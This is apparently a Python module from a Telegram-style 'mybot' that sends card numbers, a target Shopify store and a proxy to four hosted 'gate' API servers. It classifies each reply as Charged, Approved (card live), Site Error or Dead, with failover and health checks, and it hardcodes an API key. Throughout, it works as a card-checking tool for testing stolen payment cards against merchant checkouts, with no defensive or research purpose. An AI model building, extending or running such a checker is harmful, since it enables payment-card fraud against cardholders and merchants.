"""
Shopify API Manager for mybot.
Integrates the 4 hosted Shopify API servers with:
  - Dynamic health checking (/health) & active pool management
  - Intelligent load balancing & failover across replicas
  - Standardized /shopify and /check endpoint dispatchers
  - Official August 2026 response classifier (Charged / Approved / Site Error / Dead)
"""

import asyncio
import aiohttp
import logging
import random
import time
import urllib.parse
from typing import Optional, Dict, Any, List, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HOSTED API SERVERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_SERVERS = [
    "https://api-production-d12e.up.railway.app",
    "https://api-production-62e5.up.railway.app",
    "https://api-production-9ff0.up.railway.app",
    "https://api-production-2dfa1.up.railway.app",
]

# Primary API Key configured across the replicas
SHOPIFY_API_KEY = "oozaruhshop"
ALT_API_KEY     = "oozaruhshop"

# Active servers pool (updated automatically by health checker)
ACTIVE_API_SERVERS: List[str] = API_SERVERS.copy()
SERVER_HEALTH: Dict[str, dict] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVER SELECTOR & FORMATTERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_active_server() -> str:
    """Returns a random server from the currently active healthy pool."""
    pool = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
    return random.choice(pool)

def format_proxy(proxy: Optional[str]) -> Optional[str]:
    """Normalizes proxy to ip:port or ip:port:user:pass format for API."""
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith("http://") or p.startswith("https://"):
        parsed = urllib.parse.urlparse(p)
        if parsed.username and parsed.password:
            return f"{parsed.hostname}:{parsed.port}:{parsed.username}:{parsed.password}"
        return f"{parsed.hostname}:{parsed.port}"
    return p

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GATE RESPONSE CLASSIFIER (August 2026 Standards)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify_gate_response(response_msg: str, raw_dict: Optional[dict] = None, gateway: str = "") -> dict:
    """
    Standardized classification of gate responses across Shopify (August 2026 Standards).
    Categories:
      - 'Charged': Successful order / captured payment / receipt
      - 'Approved': Live card (insufficient funds, CVV mismatch, 3DS required, AVS mismatch)
      - 'Site Error': Bot/Store/API issue (Throttled, No product, Checkout failure) -> Needs site retry
      - 'Dead': Explicit card decline (Expired, Stolen, Do not honor, Invalid number, etc.)
    """
    if raw_dict is None:
        raw_dict = {}

    # Check explicit API flags first
    charged_flag = str(raw_dict.get('Charged', '')).lower() == 'true' or str(raw_dict.get('charged', '')).lower() == 'true'
    approved_flag = str(raw_dict.get('Approved', '')).lower() == 'true' or str(raw_dict.get('approved', '')).lower() == 'true'

    if charged_flag:
        return {'status': 'Charged', 'retry': False}
    if approved_flag:
        return {'status': 'Approved', 'retry': False}

    msg = str(response_msg or "").strip()
    msg_upper = msg.upper()

    # ── 1. CHARGED ──
    CHARGED_KEYWORDS = [
        'ORDER_PLACED', 'PAYMENT_COMPLETE', 'SUBMITSUCCESS', 'ORDER_CREATED',
        'PROCESSEDRECEIPT', 'PAYMENT SUCCESSFUL', 'SUCCEEDED', 'AUTHORISED',
        'PAYMENT ACCEPTED', 'THANK YOU FOR YOUR ORDER', 'THANK YOU', 'CHARGED',
        'SALE', 'RECEIPT', 'RECEIPT_ID', 'CONFIRMATION_NUMBER', 'ORDER_CONFIRMED',
        'TRANSACTION_COMPLETED', 'ORDER_STATUS_URL', 'ORDER_SUCCESS'
    ]
    if any(k in msg_upper for k in CHARGED_KEYWORDS):
        return {'status': 'Charged', 'retry': False}

    # ── 2. APPROVED (Card is live) ──
    INSUFFICIENT_FUNDS_KEYWORDS = [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'NOT_ENOUGH_BALANCE',
        'NOT ENOUGH BALANCE', 'LOW_BALANCE', '140'
    ]
    CVV_MISMATCH_KEYWORDS = [
        'INVALID_CVC', 'INCORRECT_CVC', 'CVC_DECLINED', 'CVV MISMATCH', 'CVV_MISMATCH',
        'SECURITY CODE', 'SECURITY_CODE', 'CVC CHECK FAILED', 'CVC_CHECK', 'INVALID_CVV',
        '103', '144'
    ]
    THREEDS_KEYWORDS = [
        '3DS_REQUIRED', '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED',
        'ACTION_REQUIRED', 'REDIRECTSHOPPER', 'CHALLENGESHOPPER',
        'IDENTIFYSHOPPER', 'PRESENTTOSHOPPER', '128'
    ]
    AVS_MISMATCH_KEYWORDS = [
        'INCORRECT_ZIP', 'ZIP_MISMATCH', 'AVS_FAILED', 'BILLING_ADDRESS_MISMATCH',
        'ADDRESS VERIFICATION FAILED', 'POSTAL_CODE_MISMATCH'
    ]
    APPROVED_KEYWORDS = [
        'APPROVED', 'APPROVE_WITH_ID', 'SUCCESS', 'ZERO AUTH', 'LIVE', 'CCN LIVE',
        'CARD_TESTING'
    ]

    if any(k in msg_upper for k in INSUFFICIENT_FUNDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in CVV_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in THREEDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in AVS_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in APPROVED_KEYWORDS) and not any(k in msg_upper for k in ['NOT APPROVED', 'UNAPPROVED', 'DECLINED']):
        return {'status': 'Approved', 'retry': False}

    # ── 3. SITE / INFRASTRUCTURE ERRORS ──
    SITE_ERROR_KEYWORDS = [
        'NO_PRODUCT', 'THROTTLED', 'TIMEOUT', 'TOKENIZATION_FAILED',
        'SITE_REQUIRES_LOGIN', 'CART_FAILED', 'CHECKOUT_FAILED',
        'NEGOTIATE_FAILED', 'GRAPHQL_ERROR', 'SESSION_EXPIRED',
        'NO_SESSION_TOKEN', 'NO_ATTEMPT_TOKEN', 'NO_SELLER_PROPOSAL',
        'CHECKPOINTDENIED', 'NO_SHOPIFY_PAYMENTS_GATEWAY', 'SUBMIT_FAILED',
        'ORDER_CREATION_FAILED', 'NO_PAYMENT_REQUIRED', 'PROXY ERROR',
        'CONNECTION REFUSED', 'HOST UNREACHABLE', 'INTERNAL_SERVER_ERROR',
        'GATEWAY_TIMEOUT', 'BAD_GATEWAY', 'CLOUDFLARE_BLOCKED',
        'MERCHANT_ACCOUNT_CLOSED', 'GATEWAY_NOT_CONFIGURED',
        'SITE DEAD', 'INVALID SITE', 'CAPTCHA_REQUIRED', 'NOT_SUPPORTED',
        'FAILED TO GET TOKEN', 'SITE ERROR'
    ]
    if any(k in msg_upper for k in SITE_ERROR_KEYWORDS):
        return {'status': 'Site Error', 'retry': True}

    # ── 4. DEAD (Explicit Card Decline) ──
    return {'status': 'Dead', 'retry': False}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLIENT ENDPOINTS (/shopify and /check)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_shopify_card(
    site: str,
    cc: str,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    max_retries: int = 3,
    timeout_sec: float = 40.0,
) -> dict:
    """
    Calls GET /shopify on an active healthy server with automatic failover.
    Returns standard dict:
      {
        'Response': str,
        'CC': str,
        'Price': str,
        'Gate': str,
        'Site': str,
        'Charged': str ('True'/'False'),
        'Approved': str ('True'/'False'),
        'Time': str,
        'Status': bool,
        'Classification': dict
      }
    """
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    try:
        tested_servers = set()
        for attempt in range(max_retries):
            candidates = [s for s in ACTIVE_API_SERVERS if s not in tested_servers]
            if not candidates:
                candidates = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
            server = random.choice(candidates)
            tested_servers.add(server)

            params = {
                "site": site,
                "cc": cc,
                "key": SHOPIFY_API_KEY,
            }
            if proxy_str:
                params["proxy"] = proxy_str

            url = f"{server}/shopify?{urllib.parse.urlencode(params)}"
            try:
                async with session.get(url, timeout=timeout_sec) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        resp_msg = data.get("Response", data.get("card_response", "Unknown"))
                        gateway = data.get("Gate", data.get("Gateway", "Shopify Payments"))
                        data["Classification"] = classify_gate_response(resp_msg, data, gateway)
                        data["Status"] = data["Classification"]["status"] in ("Charged", "Approved")
                        return data
                    elif resp.status in (401, 403):
                        alt_url = f"{server}/shopify?{urllib.parse.urlencode({**params, 'key': ALT_API_KEY})}"
                        async with session.get(alt_url, timeout=timeout_sec) as alt_resp:
                            if alt_resp.status == 200:
                                data = await alt_resp.json()
                                resp_msg = data.get("Response", data.get("card_response", "Unknown"))
                                gateway = data.get("Gate", data.get("Gateway", "Shopify Payments"))
                                data["Classification"] = classify_gate_response(resp_msg, data, gateway)
                                data["Status"] = data["Classification"]["status"] in ("Charged", "Approved")
                                return data
            except Exception as e:
                logging.warning(f"[shopify_api] Attempt {attempt+1} on {server} failed: {e}")
                await asyncio.sleep(0.3)

        return {
            "Response": "API Replicas Timeout or Error",
            "CC": cc,
            "Price": "0.00",
            "Gate": "Shopify Payments",
            "Site": site,
            "Charged": "False",
            "Approved": "False",
            "Time": "0s",
            "Status": False,
            "Classification": {"status": "Site Error", "retry": True},
        }
    finally:
        if close_session:
            await session.close()


async def check_site(
    site: str,
    card: Optional[str] = None,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    timeout_sec: float = 20.0,
) -> dict:
    """
    Calls GET /check to verify if store has products and active payment gateway.
    """
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    try:
        server = get_active_server()
        key = SHOPIFY_API_KEY
        params = {"site": site, "key": key}
        if card:
            params["card"] = card
        if proxy_str:
            params["proxy"] = proxy_str

        url = f"{server}/check?{urllib.parse.urlencode(params)}"
        try:
            async with session.get(url, timeout=timeout_sec) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass

        for alt_server in API_SERVERS:
            if alt_server == server:
                continue
            alt_key = SHOPIFY_API_KEY
            alt_params = {"site": site, "key": alt_key}
            if card:
                alt_params["card"] = card
            if proxy_str:
                alt_params["proxy"] = proxy_str
            try:
                async with session.get(f"{alt_server}/check?{urllib.parse.urlencode(alt_params)}", timeout=timeout_sec) as resp:
                    if resp.status == 200:
                        return await resp.json()
            except Exception:
                continue

        return {"valid": False, "site": site, "reason": "CHECK_FAILED", "detail": "All replicas unreachable"}
    finally:
        if close_session:
            await session.close()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND HEALTH CHECK LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def auto_health_check():
    """
    Polls /health on all 4 API servers every 60 seconds.
    Updates ACTIVE_API_SERVERS with only responsive replicas.
    """
    logging.info("[shopify_api] Background auto_health_check started for 4 API servers.")
    while True:
        try:
            active = []
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for api in API_SERVERS:
                    t0 = time.time()
                    try:
                        async with session.get(f"{api}/health") as resp:
                            elapsed = round(time.time() - t0, 3)
                            if resp.status == 200:
                                data = await resp.json()
                                active.append(api)
                                SERVER_HEALTH[api] = {
                                    "status": "online",
                                    "latency": f"{elapsed}s",
                                    "pool_size": data.get("pool_size", 0),
                                    "site_concurrency": data.get("site_concurrency", 0),
                                    "max_price": data.get("max_price", 0),
                                    "last_check": time.time(),
                                }
                            else:
                                SERVER_HEALTH[api] = {"status": f"HTTP {resp.status}", "latency": f"{elapsed}s", "last_check": time.time()}
                    except Exception as e:
                        SERVER_HEALTH[api] = {"status": f"offline ({type(e).__name__})", "latency": "-", "last_check": time.time()}

            if active:
                ACTIVE_API_SERVERS.clear()
                ACTIVE_API_SERVERS.extend(active)
                logging.debug(f"[shopify_api] Health check complete. Active replicas: {len(active)}/{len(API_SERVERS)}")
            else:
                logging.warning("[shopify_api] Warning: No replicas answered /health 200! Keeping previous pool.")
        except Exception as e:
            logging.error(f"[shopify_api] Health check loop exception: {e}")

        await asyncio.sleep(60)

def get_health_summary() -> str:
    """Formats human-readable status of the 4 API servers."""
    lines = [
        "<b>⚡ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗔𝗣𝗜 𝗖𝗹𝘂𝘀𝘁𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]
    for idx, s in enumerate(API_SERVERS, 1):
        info = SERVER_HEALTH.get(s, {})
        status = info.get("status", "unknown")
        latency = info.get("latency", "-")
        domain = urllib.parse.urlparse(s).netloc.split(".")[0]
        icon = "🟢" if status == "online" else "🔴"
        lines.append(f"{icon} <b>Replica {idx}</b> (<code>{domain}</code>)")
        lines.append(f"  ├ Status: <code>{status}</code>")
        lines.append(f"  └ Latency: <code>{latency}</code>")

    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <b>Active Replicas:</b> {len(ACTIVE_API_SERVERS)}/{len(API_SERVERS)}")
    return "\n".join(lines)
